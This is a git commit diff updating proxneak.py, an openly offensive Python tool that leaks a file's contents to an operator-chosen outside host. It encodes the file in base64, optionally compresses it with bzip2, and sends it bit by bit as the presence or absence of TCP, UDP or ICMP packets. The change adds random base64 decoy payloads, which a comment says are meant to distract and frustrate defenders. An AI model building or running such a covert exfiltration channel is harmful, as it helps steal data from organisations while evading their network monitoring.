0869412fc65e4c895b2d472547757f620136a8e2
NetworkLlama <jfrates@gmail.com>
2013-09-06 13:58:45 -0500

    Update proxneak.py

--- proxneak.py
+++ proxneak.py
@@ -16,11 +16,13 @@
 # Place, Suite 330, Boston, MA  02111-1307  USA
 #
 
-# TODO: Add gzip functionality to reduce time to send overall file
-
 import argparse
 import base64
+import bz2
+import random
 import socket
+import string
+import sys
 import time
 
 parser = argparse.ArgumentParser(description='Sneak data out through any ' +
@@ -43,20 +45,20 @@ parser.add_argument('-r', nargs=1, metavar='integer',
     '(default 1; recommended is 5 or less)')
 parser.add_argument('-v', action='store_true', help='Verbose mode (be aware ' +
     'that this may leave behind artifacts)')
-parser.add_argument('-V', action='version', version='0.2',
+parser.add_argument('-V', action='version', version='0.3',
     help='Display version number')
 parser.add_argument('-z', action='store_true',
-    help='Compress content before sending (not implemented yet)')
+    help='Compress content using bzip2 before sending')
 
 args = parser.parse_args()
 
 # Set some default parameters if they're not already set by argument.
-# Defaults are port 80, 1 packet/sec, use TCP
+# Defaults are port 53, 1 packet/sec, use UDP
 if args.d:
     dest = args.d[0]
 else:
     print "Destination address (-d) is required."
-    exit()
+    sys.exit()
 if not args.p:
     dstport = 53
 else:
@@ -67,8 +69,6 @@ if not args.r:
     pps = 1
 else:
     pps = int(args.r[0])
-
-zipstatus = args.z
 
 if not args.proto:
     proto = 'TCP'
@@ -82,13 +82,25 @@ else:
     else:
         proto = 'UDP'
 
-# Set default packet data
-# TODO: Make this look more realistic
-# TODO: Come up with variable packet contents based on presumed protocol
-data = '436174686572696e65'.decode('hex')
-
-# Remove next after debugging complete
 debug_count = 0
+
+data = ''
+
+
+# Set default packet data.  This is a random string that is then encoded with
+# base64.  The intention is to drive the defenders nuts trying to decode and
+# then decrypt what looks like encrypted data, thus further distracting them
+# from the true goal of the program.
+# TODO: Make this look more realistic for some protocols
+# TODO: ICMP to look like Windows, Linux, or Plan9
+# TODO: TCP to look like Windows or Linux
+def p_data():
+    global data
+    data_len = random.randrange(16, 120)
+    data.join(random.choice(string.ascii_uppercase + string.digits)
+        for x in range(data_len))
+    data = base64.b64encode(data)
+    return data
 
 
 # binstring takes a single character and converts it to an 8-character string
@@ -114,12 +126,13 @@ def sendchar(c, delay):
         return
     for l in str1:
         if l == '0':
-            # Remove next two after debugging complete
-            debug_count += 1
+            if args.v:
+                debug_count += 1
             # print str(debug_count) + " No packet to send"
             time.sleep(delay)
         else:
-            debug_count += 1
+            if args.v:
+                debug_count += 1
             buildandsend(delay)
 
 
@@ -144,13 +157,16 @@ def buildandsend(delay):
         print str(debug_count) + " Sending packet"
     if (proto == 'TCP'):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-        s.connect((dest, dstport))
-        s.close
+        try:
+            s.connect((dest, dstport))
+            s.close
+        except:
+            pass
         time.sleep(delay)
     if (proto == 'UDP'):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
         s.connect((dest, dstport))
-        s.send(data)
+        s.send(p_data())
         s.close
         time.sleep(delay)
     if (proto == 'ICMP'):
@@ -165,23 +181,31 @@ def buildandsend(delay):
 # Retrieve the data to send and put it in base64 format.  This removes the
 # possibility of NULL and 0xFF characters (terminating string) being sent.
 # TODO: Compress before conversion if required
-content = open(fin, mode='r')
-message = base64.b64encode(content.read())
+def main():
+    content = open(fin, mode='r')
+    if args.z:
+        message = base64.b64encode(bz2.compress(content.read()))
+    else:
+        message = base64.b64encode(content.read())
 
-# Debug code to compare input and output
-if args.v:
-    tMessageFile = open('tempmessage-b64', 'wb')
-    tMessageFile.write(message)
-    tMessageFile.close
+    # Debug code to compare input and output
+    if args.v:
+        tMessageFile = open('tempmessage-b64', 'wb')
+        tMessageFile.write(message)
+        tMessageFile.close
 
-# Synchronize the connection by sending eight packets
-print "Synchronizing..."
-sendmessage(chr(255), pps)
+    # Synchronize the connection by sending eight packets
+    print "Synchronizing..."
+    sendmessage(chr(255), pps)
 
-# Send the message as one bit per transmission
-print "Sending data..."
-sendmessage(message, pps)
+    # Send the message as one bit per transmission
+    print "Sending data..."
+    sendmessage(message, pps)
 
-# Close out the connection with ending sequence of 0x00FF
-print "Finishing up."
-sendmessage(chr(0) + chr(255) + chr(255), pps)
+    # Close out the connection with ending sequence of 0x00FF
+    print "Finishing up."
+    sendmessage(chr(0) + chr(255) + chr(255), pps)
+
+
+if __name__ == '__main__':
+    main()
